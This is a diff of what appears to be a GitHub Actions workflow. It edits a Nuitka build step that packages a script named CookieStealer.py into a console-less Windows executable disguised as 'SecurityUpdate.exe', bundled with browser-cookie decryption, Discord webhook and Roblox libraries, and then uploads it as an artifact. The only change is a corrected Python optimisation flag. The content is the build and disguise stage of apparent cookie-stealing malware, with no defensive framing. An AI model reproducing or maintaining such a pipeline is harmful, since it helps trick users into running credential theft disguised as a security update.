@@ -26,7 +26,7 @@ jobs:
 
     - name: Build executable with Nuitka
       run: |
-        python -m nuitka --standalone --onefile --windows-console-mode=disable --remove-output --output-filename=SecurityUpdate.exe --windows-icon-from-ico=icon32.ico --include-module=win32crypt --include-module=Crypto.Cipher.AES --include-module=browser_cookie3 --include-module=discordwebhook --include-module=robloxpy --include-module=httpx --include-module=requests --include-module=sqlite3 --include-module=json --include-module=base64 --python-flag=O --python-flag=-S CookieStealer.py
+        python -m nuitka --standalone --onefile --windows-console-mode=disable --remove-output --output-filename=SecurityUpdate.exe --windows-icon-from-ico=icon32.ico --include-module=win32crypt --include-module=Crypto.Cipher.AES --include-module=browser_cookie3 --include-module=discordwebhook --include-module=robloxpy --include-module=httpx --include-module=requests --include-module=sqlite3 --include-module=json --include-module=base64 --python-flag=-O --python-flag=-S CookieStealer.py
 
     - name: Upload executable
       uses: actions/upload-artifact@v4
